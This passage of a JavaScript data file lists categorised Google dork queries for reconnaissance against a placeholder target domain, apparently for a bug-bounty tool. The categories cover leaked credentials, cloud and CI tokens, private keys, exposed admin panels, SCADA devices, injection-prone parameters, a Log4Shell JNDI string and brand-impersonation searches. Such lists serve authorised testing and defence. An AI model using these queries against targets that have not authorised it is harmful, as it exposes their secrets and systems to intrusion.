      {label:"Database dumps", query:'site:{domain} ext:sql | ext:dump "INSERT INTO" | "CREATE TABLE"'},
      {label:"Roadmap documents", query:'site:{domain} ext:pdf | ext:pptx "roadmap" | "product plan"'},
      {label:"IT runbooks", query:'site:{domain} ext:pdf | ext:doc "runbook" | "playbook" | "SOP"'},
      {label:"Compliance documents", query:'site:{domain} ext:pdf "GDPR" | "SOC 2" | "ISO 27001" | "PCI DSS"'},
    ]
  },
  {
    id:"sourcecode", title:"Source Code Exposure", emoji:"💻",
    color:"rgba(99,179,255,0.12)", border:"rgba(99,179,255,0.3)", textColor:"#63b3ff",
    dorks:[
      {label:"Git config exposed", query:'site:{domain} inurl:"/.git/config"'},
      {label:"Package.json exposed", query:'site:{domain} inurl:"package.json" -node_modules'},
      {label:"Dockerfile exposed", query:'site:{domain} inurl:Dockerfile | inurl:docker-compose.yml'},
      {label:"Requirements.txt", query:'site:{domain} inurl:requirements.txt | inurl:Pipfile'},
      {label:"Source maps", query:'site:{domain} ext:map | ext:js.map'},
      {label:"Hardcoded secrets in JS", query:'site:{domain} ext:js "password" | "secret" | "token" | "key"'},
      {label:"Composer.json (PHP)", query:'site:{domain} inurl:composer.json | inurl:composer.lock'},
      {label:"Gemfile (Ruby)", query:'site:{domain} inurl:Gemfile | inurl:Gemfile.lock'},
      {label:"Go.sum / Go.mod", query:'site:{domain} inurl:go.sum | inurl:go.mod'},
      {label:"Cargo.toml (Rust)", query:'site:{domain} inurl:Cargo.toml | inurl:Cargo.lock'},
      {label:"pom.xml (Maven/Java)", query:'site:{domain} inurl:pom.xml | inurl:build.gradle'},
      {label:"Makefile / CMakeLists", query:'site:{domain} inurl:Makefile | inurl:CMakeLists.txt'},
      {label:"CircleCI / GitHub Actions config", query:'site:{domain} inurl:.circleci | inurl:.github/workflows'},
      {label:"Jenkinsfile exposed", query:'site:{domain} inurl:Jenkinsfile | inurl:Jenkinsfile.groovy'},
      {label:"Travis CI config", query:'site:{domain} inurl:.travis.yml | inurl:travis.yml'},
      {label:"Webpack bundle analysis", query:'site:{domain} inurl:bundle.js | inurl:main.js -minified'},
      {label:"Debug symbols (.map)", query:'site:{domain} ext:js.map | ext:css.map "sources"'},
      {label:"Config in front-end", query:'site:{domain} ext:js "config" "apiKey" | "clientId" | "secret"'},
      {label:"Exposed Python files", query:'site:{domain} ext:py "import" | "def " | "class "'},
      {label:"Exposed PHP source", query:'site:{domain} ext:php "<?php" | "include(" | "require("'},
      {label:"Exposed ASP source", query:'site:{domain} ext:asp | ext:aspx "<%@" | "Response.Write"'},
      {label:"JSP / Java source", query:'site:{domain} ext:jsp | ext:java "import java" | "public class"'},
      {label:"Database schema files", query:'site:{domain} ext:sql "CREATE TABLE" | "ALTER TABLE"'},
      {label:"Exposed shell scripts", query:'site:{domain} ext:sh | ext:bash "#!/bin" "password" | "API_KEY"'},
      {label:"Terraform files", query:'site:{domain} ext:tf | ext:tfvars "aws_" | "google_" | "azurerm_"'},
    ]
  },
  {
    id:"juicy", title:"Juicy Extensions", emoji:"🍯",
    color:"rgba(251,146,60,0.12)", border:"rgba(251,146,60,0.3)", textColor:"#fb923c",
    dorks:[
      {label:"PHP with params", query:'site:{domain} ext:php inurl:"?"'},
      {label:"ASP pages", query:'site:{domain} ext:aspx | ext:asp | ext:asmx'},
      {label:"JSP pages", query:'site:{domain} ext:jsp | ext:jspx | ext:do | ext:action'},
      {label:"Old backup files", query:'site:{domain} ext:bak | ext:old | ext:orig | ext:bkp'},
      {label:"XML config files", query:'site:{domain} ext:xml | ext:conf | ext:properties'},
      {label:"YAML config files", query:'site:{domain} ext:yaml | ext:yml "password" | "secret"'},
      {label:"Perl CGI scripts", query:'site:{domain} ext:pl | ext:cgi'},
      {label:"Classic ASP pages", query:'site:{domain} ext:asp inurl:"?"'},
      {label:"Ruby ERB templates", query:'site:{domain} ext:erb | ext:rhtml | ext:haml'},
      {label:"ColdFusion pages", query:'site:{domain} ext:cfm | ext:cfc | ext:cfml'},
      {label:"PHP4 legacy code", query:'site:{domain} ext:php4 | ext:php3 | ext:php5'},
      {label:"GraphQL schema", query:'site:{domain} ext:graphql | inurl:schema.graphql'},
      {label:"INI config files", query:'site:{domain} ext:ini "password" | "user" | "host"'},
      {label:"Exposed .htaccess", query:'site:{domain} ext:htaccess "AuthUserFile" | "Require"'},
      {label:"Web.config (IIS)", query:'site:{domain} ext:config "web.config" "connectionString"'},
      {label:"App.config (.NET)", query:'site:{domain} ext:config "appSettings" "add key"'},
      {label:"Server.xml (Tomcat)", query:'site:{domain} inurl:server.xml | inurl:tomcat | ext:xml "Connector port"'},
      {label:"WSDL services", query:'site:{domain} ext:wsdl | inurl:?wsdl | inurl:?WSDL'},
      {label:"Sitemap files", query:'site:{domain} inurl:sitemap.xml | inurl:sitemap_index.xml'},
      {label:"Robots.txt secrets", query:'site:{domain} inurl:robots.txt "Disallow:" "admin" | "api" | "internal"'},
      {label:"Exposed JSON data", query:'site:{domain} ext:json "data" | "results" | "users"'},
      {label:"CSV data exports", query:'site:{domain} ext:csv "email" | "phone" | "address"'},
      {label:"Exposed XML data", query:'site:{domain} ext:xml "username" | "password" | "email"'},
      {label:"Login credential files", query:'site:{domain} ext:txt | ext:log "login" | "credential" | "user"'},
      {label:"WebAssembly files", query:'site:{domain} ext:wasm | inurl:wasm'},
    ]
  },
  {
    id:"network", title:"Network & IoT Devices", emoji:"📡",
    color:"rgba(167,139,250,0.12)", border:"rgba(167,139,250,0.3)", textColor:"#a78bfa",
    dorks:[
      {label:"Open VPN portals", query:'site:{domain} inurl:"/vpn/" | inurl:"/remote/" | inurl:"/sslvpn/"'},
      {label:"Network monitor pages", query:'site:{domain} intitle:"network status" | intitle:"network monitor"'},
      {label:"Webcam streams", query:'site:{domain} inurl:"/view.shtml" | inurl:"/view/index.shtml"'},
      {label:"Router admin pages", query:'site:{domain} intitle:"router" | intitle:"gateway" inurl:admin'},
      {label:"Printer admin pages", query:'site:{domain} intitle:"printer" | intitle:"HP" inurl:admin'},
      {label:"Kibana / Elasticsearch", query:'site:{domain} inurl:":9200" | inurl:":5601" | inurl:kibana'},
      {label:"SCADA / ICS", query:'site:{domain} intitle:"SCADA" | "PLC" | "industrial control"'},
      {label:"Modbus / DNP3", query:'site:{domain} "Modbus" | "DNP3" | "PROFINET"'},
      {label:"Exposed IoT devices", query:'site:{domain} intitle:"IP Camera" | "Live View" | "HIKVISION"'},
      {label:"NAS panels", query:'site:{domain} intitle:"QNAP" | intitle:"Synology" | intitle:"NAS"'},
      {label:"UPS management", query:'site:{domain} intitle:"APC Web" | "UPS Management"'},
      {label:"SNMP management", query:'site:{domain} inurl:snmp | intitle:"SNMP Management"'},
      {label:"VoIP panels", query:'site:{domain} intitle:"FreePBX" | inurl:asterisk | inurl:freepbx'},
      {label:"Palo Alto firewall", query:'site:{domain} inurl:php/login.php intitle:"Palo Alto"'},
      {label:"Cisco ASA", query:'site:{domain} intitle:"Cisco ASDM" | "Adaptive Security Appliance"'},
      {label:"Juniper", query:'site:{domain} intitle:"Juniper Networks" | "Junos"'},
      {label:"Fortinet FortiGate", query:'site:{domain} intitle:"FortiGate" | inurl:fortigate'},
      {label:"Check Point", query:'site:{domain} intitle:"Check Point" | inurl:checkpoint'},
      {label:"Network attached cameras", query:'site:{domain} intitle:"Live NetSnap Cam-Server feed"'},
      {label:"OpenWRT router", query:'site:{domain} intitle:"OpenWrt" | inurl:cgi-bin/luci'},
      {label:"MikroTik", query:'site:{domain} intitle:"MikroTik" | inurl:winbox | intitle:"RouterOS"'},
      {label:"pfSense", query:'site:{domain} intitle:"pfSense" | inurl:pfSense'},
      {label:"Nagios monitoring", query:'site:{domain} inurl:nagios | intitle:"Nagios"'},
      {label:"Zabbix monitoring", query:'site:{domain} inurl:zabbix | intitle:"Zabbix"'},
      {label:"Prometheus metrics", query:'site:{domain} inurl:/metrics | intitle:"Prometheus Time Series"'},
    ]
  },
  {
    id:"cms", title:"CMS & WordPress", emoji:"🔧",
    color:"rgba(52,211,153,0.12)", border:"rgba(52,211,153,0.3)", textColor:"#34d399",
    dorks:[
      {label:"WordPress content", query:'site:{domain} inurl:wp-content | inurl:wp-includes'},
      {label:"WordPress config backup", query:'site:{domain} inurl:wp-config.php | inurl:wp-config.php.bak'},
      {label:"WP REST API users", query:'site:{domain} inurl:/wp-json/wp/v2/users'},
      {label:"Joomla config", query:'site:{domain} inurl:configuration.php | inurl:joomla.conf'},
      {label:"Drupal config", query:'site:{domain} inurl:settings.php | inurl:drupal.conf'},
      {label:"Magento admin", query:'site:{domain} inurl:admin | inurl:backend inurl:magento | inurl:mage'},
      {label:"WP plugin vulnerabilities", query:'site:{domain} inurl:wp-content/plugins ext:php'},
      {label:"WP theme exposure", query:'site:{domain} inurl:wp-content/themes | intitle:"index of" "wp-content"'},
      {label:"WP xmlrpc.php", query:'site:{domain} inurl:xmlrpc.php'},
      {label:"WP install scripts", query:'site:{domain} inurl:wp-admin/install.php | inurl:install.php'},
      {label:"Joomla admin panel", query:'site:{domain} inurl:administrator | intitle:"Joomla"'},
      {label:"Drupal admin panel", query:'site:{domain} inurl:/admin | intitle:"Drupal"'},
      {label:"OpenCart admin", query:'site:{domain} inurl:index.php?route=common/login'},
      {label:"PrestaShop admin", query:'site:{domain} inurl:prestashop | inurl:backoffice'},
      {label:"Shopify app", query:'site:{domain}.myshopify.com | inurl:apps.shopify.com "{domain}"'},
      {label:"WooCommerce exposed", query:'site:{domain} inurl:woocommerce | inurl:/cart | inurl:/checkout'},
      {label:"Ghost CMS", query:'site:{domain} inurl:ghost/api | inurl:#/ghost'},
      {label:"Strapi CMS", query:'site:{domain} inurl:/admin | intitle:"Strapi"'},
      {label:"Contentful API", query:'site:{domain} "ctfAssets" | "contentfulEnvironment"'},
      {label:"Wagtail CMS", query:'site:{domain} inurl:wagtail | inurl:/cms/'},
      {label:"MODX", query:'site:{domain} inurl:modx | intitle:"MODX"'},
      {label:"Typo3", query:'site:{domain} inurl:typo3 | intitle:"TYPO3 CMS"'},
      {label:"EE / ExpressionEngine", query:'site:{domain} inurl:system/expressionengine | "ExpressionEngine"'},
      {label:"Craft CMS", query:'site:{domain} inurl:craft | intitle:"Craft CMS"'},
      {label:"Kentico CMS", query:'site:{domain} inurl:CMSAdministration | inurl:Kentico'},
    ]
  },
  {
    id:"xss_sqli", title:"XSS & Injection Points", emoji:"💉",
    color:"rgba(248,113,113,0.12)", border:"rgba(248,113,113,0.3)", textColor:"#f87171",
    dorks:[
      {label:"Reflected XSS in URL", query:'site:{domain} inurl:"search=" | inurl:"q=" | inurl:"query="'},
      {label:"SQL injection in URL", query:'site:{domain} inurl:"id=" | inurl:"cat=" | inurl:"item=" | inurl:"page="'},
      {label:"PHP with GET params", query:'site:{domain} ext:php inurl:"?"'},
      {label:"Error-based SQLi", query:'site:{domain} "You have an error in your SQL syntax"'},
      {label:"ASP injection points", query:'site:{domain} ext:asp | ext:aspx inurl:"?"'},
      {label:"SSTI injection points", query:'site:{domain} inurl:"template=" | inurl:"view=" | inurl:"layout="'},
      {label:"Open redirect targets", query:'site:{domain} inurl:"redirect=" | inurl:"next=" | inurl:"return=" | inurl:"url="'},
      {label:"File inclusion vectors", query:'site:{domain} inurl:"file=" | inurl:"page=" | inurl:"include=" | inurl:"path="'},
      {label:"Command injection", query:'site:{domain} inurl:"exec=" | inurl:"cmd=" | inurl:"run="'},
      {label:"XML injection", query:'site:{domain} inurl:"xml=" | ext:xml | ext:xsl'},
      {label:"SSRF vulnerable params", query:'site:{domain} inurl:"fetch=" | inurl:"target=" | inurl:"destination="'},
      {label:"Upload forms", query:'site:{domain} inurl:"upload" | inurl:"file-upload" | inurl:"fileupload"'},
      {label:"Parameter pollution", query:'site:{domain} inurl:"?id=1&id=2" | inurl:"?param="'},
      {label:"JSON injection", query:'site:{domain} inurl:"json=" | inurl:".json?" | inurl:"data="'},
      {label:"CORS wildcard", query:'site:{domain} inurl:api "Access-Control-Allow-Origin: *"'},
      {label:"Eval-based injection", query:'site:{domain} inurl:eval= | inurl:execute= | ext:php "eval("'},
      {label:"XXE potential", query:'site:{domain} ext:xml | inurl:xml | "application/xml" inurl:upload'},
      {label:"Prototype pollution", query:'site:{domain} ext:js "Object.prototype" | "__proto__" | "constructor"'},
      {label:"Path traversal", query:'site:{domain} inurl:"../../../" | inurl:"..%2F..%2F"'},
      {label:"Template injection (ERB)", query:'site:{domain} inurl:"?name=" | inurl:"?user=" | inurl:"?msg="'},
      {label:"HTTP header injection", query:'site:{domain} inurl:redirect= "Location:" | "Set-Cookie:"'},
      {label:"Deserialization points", query:'site:{domain} inurl:serialize | inurl:deserialize | ext:java "readObject"'},
      {label:"NoSQL injection", query:'site:{domain} inurl:?query= | inurl:?filter= ext:json | inurl:mongodb'},
      {label:"HTML injection", query:'site:{domain} inurl:?message= | inurl:?error= | inurl:?notice='},
      {label:"Log4Shell / JNDI", query:'site:{domain} "jndi:" | "log4j" | "${jndi:ldap"'},
    ]
  },
  {
    id:"git_cicd", title:"Git & CI/CD Pipelines", emoji:"⚙️",
    color:"rgba(99,179,255,0.12)", border:"rgba(99,179,255,0.3)", textColor:"#93c5fd",
    dorks:[
      {label:"Exposed .git folder", query:'site:{domain} inurl:"/.git/" | inurl:".git/HEAD"'},
      {label:"GitHub repo leaks", query:'site:github.com "{domain}" password | secret | token | key'},
      {label:"GitLab CI config", query:'site:{domain} inurl:.gitlab-ci.yml | inurl:gitlab-ci.yml'},
      {label:"GitHub Actions secrets", query:'site:github.com "{domain}" "secrets." | "env:" password'},
      {label:"Bitbucket repo", query:'site:bitbucket.org "{domain}"'},
      {label:"CircleCI config", query:'site:{domain} inurl:.circleci/config.yml | ext:yml "circleci"'},
      {label:"TravisCI secrets", query:'site:{domain} inurl:.travis.yml "env:" | "secure:"'},
      {label:"Drone CI config", query:'site:{domain} inurl:.drone.yml | inurl:drone.yml'},
      {label:"Jenkins pipeline", query:'site:{domain} inurl:Jenkinsfile | intitle:"Jenkins"'},
      {label:"Argo CD", query:'site:{domain} inurl:argocd | intitle:"Argo CD"'},
      {label:"Exposed deployment scripts", query:'site:{domain} ext:sh | ext:bash "deploy" "password" | "secret"'},
      {label:"npm/yarn tokens", query:'site:{domain} ext:npmrc | inurl:.npmrc "authToken" | "_auth"'},
      {label:"PyPI credentials", query:'site:{domain} inurl:.pypirc "password" | "username"'},
      {label:"Maven settings", query:'site:{domain} inurl:settings.xml "server" "password" | "username"'},
      {label:"Nuget API key", query:'site:{domain} ext:config "NuGet" "apiKey" | "packageSource"'},
      {label:"Docker hub credentials", query:'site:{domain} "docker login" "password" | "token"'},
      {label:"SSH deploy keys", query:'site:github.com "{domain}" "id_rsa" | "deploy_key"'},
      {label:"Heroku API keys", query:'site:{domain} "HEROKU_API_KEY" | heroku.com "api_key"'},
      {label:"GCP service account", query:'site:{domain} ext:json "type": "service_account" | "private_key"'},
      {label:"AWS IAM keys in config", query:'site:{domain} "aws_access_key_id" | "aws_secret_access_key"'},
      {label:"Terraform cloud token", query:'site:{domain} inurl:.terraformrc | "token =" "terraform"'},
      {label:"Vault tokens", query:'site:{domain} "VAULT_TOKEN" | "vault_addr"'},
      {label:"k8s secrets", query:'site:{domain} ext:yaml "kind: Secret" "stringData" | "data:"'},
      {label:"Sonarqube token", query:'site:{domain} "SONAR_TOKEN" | inurl:sonarqube'},
      {label:"Package registry leak", query:'site:{domain} inurl:packages | inurl:registry "token" | "password"'},
    ]
  },
  {
    id:"idor_auth", title:"IDOR & Auth Bypass", emoji:"🔓",
    color:"rgba(139,92,246,0.12)", border:"rgba(139,92,246,0.3)", textColor:"#c4b5fd",
    dorks:[
      {label:"IDOR in user ID", query:'site:{domain} inurl:"?user_id=" | inurl:"?userId=" | inurl:"?account="'},
      {label:"Order/Invoice IDOR", query:'site:{domain} inurl:"?order_id=" | inurl:"?invoice=" | inurl:"?receipt="'},
      {label:"Profile IDOR", query:'site:{domain} inurl:"/profile/" | inurl:"/user/" | inurl:"/account/"'},
      {label:"File download IDOR", query:'site:{domain} inurl:"?file=" | inurl:"?download=" | inurl:"?document="'},
      {label:"Admin IDOR", query:'site:{domain} inurl:"/admin/user/" | inurl:"/manage/account/"'},
      {label:"JWT in URL", query:'site:{domain} inurl:"?token=" | inurl:"?jwt=" | inurl:"?bearer="'},
      {label:"Session fixation", query:'site:{domain} inurl:"?session=" | inurl:"?sessionid=" | inurl:"?sid="'},
      {label:"API key in URL", query:'site:{domain} inurl:"?key=" | inurl:"?apikey=" | inurl:"?api-key="'},
      {label:"Insecure direct object", query:'site:{domain} inurl:"/view/" | inurl:"/get/" | inurl:"/read/"'},
      {label:"UUID in endpoint", query:'site:{domain} inurl:"/api/" inurl:"[0-9a-f]{8}-"'},
      {label:"Email verification bypass", query:'site:{domain} inurl:"?token=" "verify" | "confirm" | "activate"'},
      {label:"Password reset token", query:'site:{domain} inurl:"?reset_token=" | inurl:"?code=" | inurl:"?hash="'},
      {label:"OAuth state bypass", query:'site:{domain} inurl:"?state=" | inurl:"?code=" "oauth" | "callback"'},
      {label:"Insecure cookie", query:'site:{domain} "Set-Cookie" -"HttpOnly" -"Secure"'},
      {label:"Hidden admin params", query:'site:{domain} inurl:"?debug=" | inurl:"?admin=" | inurl:"?internal="'},
      {label:"Mass assignment in API", query:'site:{domain} ext:json "role" | "isAdmin" | "permissions"'},
      {label:"Priv escalation endpoints", query:'site:{domain} inurl:"/role" | inurl:"/permission" | inurl:"/privilege"'},
      {label:"Forgotten reset pages", query:'site:{domain} inurl:"reset" | inurl:"forgot" | inurl:"recover"'},
      {label:"Magic link abuse", query:'site:{domain} inurl:"?magic_token=" | inurl:"?link=" "login" | "access"'},
      {label:"Account takeover vectors", query:'site:{domain} inurl:"?email=" "update" | "change" | "modify"'},
      {label:"SAML assertions", query:'site:{domain} inurl:saml | inurl:SSO | inurl:assertion'},
      {label:"OAuth implicit flow", query:'site:{domain} inurl:"response_type=token" | inurl:"grant_type=implicit"'},
      {label:"Subdomain takeover", query:'site:{domain} "There is no app configured at that hostname"'},
      {label:"Exposed user data", query:'site:{domain} inurl:"/users" | inurl:"/members" | inurl:"/accounts" ext:json'},
      {label:"Replay attack vectors", query:'site:{domain} inurl:"?timestamp=" | inurl:"?nonce=" | inurl:"?signature="'},
    ]
  },
  {
    id:"bugbounty", title:"Bug Bounty Specific", emoji:"🎯",
    color:"rgba(34,211,160,0.12)", border:"rgba(34,211,160,0.3)", textColor:"#34d399",
    dorks:[
      {label:"Security.txt file", query:'site:{domain} inurl:security.txt | inurl:/.well-known/security.txt'},
      {label:"HackerOne program", query:'site:hackerone.com "{domain}"'},
      {label:"Bugcrowd program", query:'site:bugcrowd.com "{domain}"'},
      {label:"Bug bounty program page", query:'site:{domain} inurl:"bug-bounty" | inurl:"responsible-disclosure"'},
      {label:"Out-of-scope hints", query:'site:hackerone.com "{domain}" "out of scope"'},
      {label:"Disclosure policy", query:'site:{domain} "vulnerability disclosure" | "responsible disclosure"'},
      {label:"Changelog for bugs", query:'site:{domain} inurl:changelog | inurl:CHANGELOG "security" | "fix" | "vulnerability"'},
      {label:"CVE mentions", query:'site:{domain} "CVE-20" "vulnerability" | "patch" | "update"'},
      {label:"Bounty payout info", query:'site:{domain} "bounty" "reward" | "payout" | "critical" | "high"'},
      {label:"Unpatched public CVEs", query:'site:{domain} inurl:vendor | inurl:component "CVE" "unpatched"'},
      {label:"WAF bypass hints", query:'site:{domain} intitle:"403" | intitle:"blocked" | "Cloudflare" "firewall"'},
      {label:"Content security policy", query:'site:{domain} "Content-Security-Policy" "unsafe-inline" | "unsafe-eval"'},
      {label:"Clickjacking test", query:'site:{domain} -inurl:"X-Frame-Options" "login" | "admin"'},
      {label:"Reflected param in title", query:'site:{domain} intitle:"{domain}" inurl:"?q=" | inurl:"?search="'},
      {label:"Subresource integrity missing", query:'site:{domain} ext:html "<script src=" -"integrity="'},
      {label:"HSTS missing", query:'site:{domain} -inurl:"Strict-Transport-Security"'},
      {label:"Old jQuery versions", query:'site:{domain} ext:js "jquery-1." | "jquery-2." | "jquery-3.0"'},
      {label:"Prototype.js old version", query:'site:{domain} ext:js "prototype.js" "Version 1."'},
      {label:"Angular old version", query:'site:{domain} ext:js "angular.min.js" "1." | "2."'},
      {label:"React debug build", query:'site:{domain} ext:js "react.development.js" | "__REACT_DEVTOOLS"'},
      {label:"Vue devtools", query:'site:{domain} ext:js "__VUE_DEVTOOLS"'},
      {label:"Source maps in prod", query:'site:{domain} ext:map inurl:/static/ | inurl:/dist/ | inurl:/build/'},
      {label:"Exposed payment forms", query:'site:{domain} inurl:payment | inurl:checkout "card" | "cvv" | "expiry"'},
      {label:"Webhooks exposed", query:'site:{domain} inurl:webhook | inurl:hook | inurl:callback "secret" | "token"'},
      {label:"SSRF test via metadata", query:'site:{domain} inurl:"?url=" | inurl:"?src=" | inurl:"?img="'},
    ]
  },
  {
    id:"techstack", title:"Tech Stack Discovery", emoji:"🛠️",
    color:"rgba(99,179,255,0.12)", border:"rgba(99,179,255,0.3)", textColor:"#63b3ff",
    dorks:[
      {label:"PHP version disclosure", query:'site:{domain} "X-Powered-By: PHP" | "PHP/7" | "PHP/8"'},
      {label:"Apache server version", query:'site:{domain} "Server: Apache" | "Apache/2.4" | "Apache/2.2"'},
      {label:"Nginx version", query:'site:{domain} "Server: nginx" | "nginx/1."'},
      {label:"IIS version", query:'site:{domain} "Server: Microsoft-IIS" | "X-Powered-By: ASP.NET"'},
      {label:"Spring Boot actuator", query:'site:{domain} inurl:/actuator | inurl:/actuator/env | inurl:/actuator/beans'},
      {label:"Django framework", query:'site:{domain} "CSRF token" | "csrfmiddlewaretoken" | "Django"'},
      {label:"Ruby on Rails", query:'site:{domain} "X-Request-Id" | "X-Runtime" inurl:rails | "Ruby on Rails"'},
      {label:"Laravel framework", query:'site:{domain} "X-RateLimit" | "X-CSRF-TOKEN" | "laravel_session"'},
      {label:"Symfony framework", query:'site:{domain} "_symfony_" | "Symfony/Component" | "app_dev.php"'},
      {label:"Express.js", query:'site:{domain} "X-Powered-By: Express" | "express" "node"'},
      {label:"FastAPI / Flask", query:'site:{domain} "Uvicorn" | "Gunicorn" | "Flask" "application"'},
      {label:"Java Spring", query:'site:{domain} "X-Application-Context" | "spring" | "javax.servlet"'},
      {label:"WordPress version", query:'site:{domain} "wp-content" "ver=5." | "ver=6." | "generator" "WordPress"'},
      {label:"jQuery version", query:'site:{domain} ext:js "jQuery v" | "jQuery JavaScript Library v"'},
      {label:"React version", query:'site:{domain} ext:js "__react" | "react.version"'},
      {label:"Angular CLI", query:'site:{domain} "ng-version" | "Angular v" | "@angular/core"'},
      {label:"Vue.js version", query:'site:{domain} ext:js "__vue_version" | "Vue.js v"'},
      {label:"Docker exposed", query:'site:{domain} inurl:":2375" | inurl:":2376" | inurl:docker.sock'},
      {label:"Redis exposed", query:'site:{domain} inurl:":6379" | "redis_version"'},
      {label:"RabbitMQ management", query:'site:{domain} inurl:":15672" | intitle:"RabbitMQ Management"'},
      {label:"Apache Kafka", query:'site:{domain} inurl:":9092" | "kafka.bootstrap.servers"'},
      {label:"Memcached exposed", query:'site:{domain} inurl:":11211" | "memcached"'},
      {label:"MySQL exposed", query:'site:{domain} inurl:":3306" | "mysql -h"'},
      {label:"MongoDB exposed", query:'site:{domain} inurl:":27017" | "mongodb://"'},
      {label:"PostgreSQL exposed", query:'site:{domain} inurl:":5432" | "postgresql://"'},
    ]
  },
  {
    id:"phishing_social", title:"Phishing & Brand Abuse", emoji:"🎭",
    color:"rgba(248,113,113,0.12)", border:"rgba(248,113,113,0.3)", textColor:"#fca5a5",
    dorks:[
      {label:"Typosquatting domains", query:'"paypa1.com" | "g00gle.com" | "faceb00k.com" | site:*.{domain}.com'},
      {label:"Brand impersonation", query:'intitle:"{domain}" inurl:login | inurl:signin -site:{domain}'},
      {label:"Phishing kit detection", query:'"index of" "phish" | "phishing" | "credential"'},
      {label:"Credential harvester", query:'intitle:"{domain}" "password" inurl:login -site:{domain}'},
      {label:"Clone of login page", query:'inurl:{domain} "password" "username" -site:{domain}'},
      {label:"Fake support pages", query:'intitle:"support {domain}" -site:{domain}'},
      {label:"Subdomain squatting", query:'site:*.{domain}.net | site:*.{domain}.org | site:*.{domain}.info'},
      {label:"Social media impersonation", query:'site:facebook.com | site:twitter.com | site:linkedin.com "{domain}" "official"'},
      {label:"App store fakes", query:'site:apps.apple.com | site:play.google.com "{domain}" -"{domain}.com"'},
      {label:"Domain variations", query:'site:{domain}s.com | site:{domain}app.com | site:{domain}online.com'},
      {label:"LinkedIn employee recon", query:'site:linkedin.com "works at {domain}" | "{domain}" "employee"'},
      {label:"Job listings for tech stack", query:'site:linkedin.com | site:indeed.com "{domain}" "engineer" "python" | "java" | "AWS"'},
      {label:"Glassdoor culture leak", query:'site:glassdoor.com "{domain}" "security" | "password" | "credentials"'},
      {label:"Pastebin credential dumps", query:'site:pastebin.com "{domain}" "password" | "token" | "api"'},
      {label:"Document sharing sites", query:'site:scribd.com | site:slideshare.net "{domain}" "internal" | "confidential"'},
      {label:"Forum / ticket leaks", query:'site:reddit.com | site:stackoverflow.com "{domain}" "token" | "password" | "secret"'},
      {label:"App store description", query:'site:play.google.com | site:apps.apple.com "{domain}" "api" | "backend"'},
      {label:"Wayback archived pages", query:'site:web.archive.org "{domain}" "admin" | "config" | "setup"'},
      {label:"Archived job postings", query:'site:web.archive.org | site:linkedin.com "{domain}" developer "stack" | "technology"'},
      {label:"Partner / vendor mentions", query:'"{domain}" "partner" | "vendor" | "supplier" | "third party" filetype:pdf'},
      {label:"Breach / haveibeenpwned", query:'site:haveibeenpwned.com | site:dehashed.com "{domain}"'},
      {label:"Public Jira tickets", query:'site:jira.{domain} | site:issues.{domain} "password" | "token"'},
      {label:"Google Groups leak", query:'site:groups.google.com "{domain}" "password" | "internal"'},
      {label:"Bug report mentions", query:'site:bugs.{domain} | site:issues.{domain} | site:jira.{domain}'},
    ]
  },
  {
    id:"shodan_recon", title:"Shodan & Attack Surface", emoji:"🛰️",
    color:"rgba(139,92,246,0.12)", border:"rgba(139,92,246,0.3)", textColor:"#c4b5fd",
    dorks:[
      {label:"Open ports via Shodan", query:'site:shodan.io hostname:"{domain}"'},
      {label:"Fofa recon", query:'site:fofa.info host="{domain}"'},
      {label:"Censys host search", query:'site:search.censys.io "{domain}"'},
      {label:"Open RDP (3389)", query:'site:{domain} "Remote Desktop" inurl:3389'},
      {label:"Exposed Telnet", query:'site:{domain} "telnet" inurl:23 | "port 23"'},
      {label:"Open MongoDB (27017)", query:'site:{domain} inurl:27017 | "mongodb" "27017"'},
      {label:"Exposed MySQL (3306)", query:'site:{domain} inurl:3306 | "mysql" "3306"'},
      {label:"Open Redis (6379)", query:'site:{domain} inurl:6379 | "redis" "6379"'},
      {label:"Open Memcached", query:'site:{domain} inurl:11211 | "memcached"'},
      {label:"Exposed Docker (2375)", query:'site:{domain} inurl:2375 | "docker" "/v1.40/"'},
      {label:"Kubernetes API (6443)", query:'site:{domain} inurl:6443 | "kubernetes" "api"'},
      {label:"Exposed Elasticsearch (9200)", query:'site:{domain} inurl:9200 | "_cat/indices"'},
      {label:"CouchDB (5984)", query:'site:{domain} inurl:5984 | "_all_dbs"'},
      {label:"Cassandra (9042)", query:'site:{domain} inurl:9042 | "cassandra"'},
      {label:"ZooKeeper", query:'site:{domain} inurl:2181 | "zookeeper"'},
      {label:"LDAP exposed (389)", query:'site:{domain} inurl:389 | "ldap" "389"'},
      {label:"FTP (21)", query:'site:{domain} "220" "FTP" inurl:21 | "ftp://"'},
      {label:"SMTP exposed (25)", query:'site:{domain} inurl:25 | "smtp" "220"'},
      {label:"Exposed Jupyter Notebook", query:'site:{domain} inurl:8888 | "jupyter" | intitle:"Jupyter Notebook"'},
      {label:"Grafana open (3000)", query:'site:{domain} inurl:3000 | intitle:"Grafana"'},
      {label:"Jenkins open (8080)", query:'site:{domain} inurl:8080 | intitle:"Jenkins"'},
      {label:"Portainer (9000)", query:'site:{domain} inurl:9000 | intitle:"Portainer"'},
      {label:"Traefik dashboard", query:'site:{domain} inurl:8080 | intitle:"Traefik"'},
      {label:"Consul UI", query:'site:{domain} inurl:8500 | inurl:consul | intitle:"Consul"'},
      {label:"Vault UI", query:'site:{domain} inurl:8200 | inurl:vault | intitle:"HashiCorp Vault"'},
    ]
  },
  {
    id:"certificates_ssl", title:"SSL / Certificates", emoji:"🔒",
    color:"rgba(56,189,248,0.12)", border:"rgba(56,189,248,0.3)", textColor:"#7dd3fc",
    dorks:[
      {label:"Expired SSL certs", query:'site:{domain} "certificate expired" | "ssl certificate"'},
      {label:"Self-signed certificates", query:'site:{domain} "self-signed certificate" | "certificate not trusted"'},
      {label:"Weak cipher suite", query:'site:{domain} "RC4" | "DES" | "3DES" | "MD5" "cipher"'},
      {label:"Heartbleed vulnerable", query:'site:{domain} "OpenSSL 1.0.1" | "OpenSSL 1.0.0"'},
      {label:"Certificate transparency", query:'site:crt.sh "{domain}"'},
      {label:"BEAST/POODLE vulnerable", query:'site:{domain} "SSLv3" | "TLSv1.0" "enabled"'},
      {label:"Certificate pinning bypass", query:'site:{domain} "SSL pinning" | "certificate pinning" | "cert pinning"'},
      {label:"HSTS not set", query:'site:{domain} -inurl:"Strict-Transport-Security" login | admin'},
      {label:"Mixed content", query:'site:{domain} inurl:https "http://" "src=" | "href="'},
      {label:"TLS misconfiguration", query:'site:{domain} "TLS_RSA_WITH_RC4" | "TLS_NULL_WITH_NULL"'},
      {label:"Let's Encrypt wildcard", query:'site:crt.sh "*.{domain}"'},
      {label:"Subdomain via CT logs", query:'site:crt.sh "%25.{domain}" "issued"'},
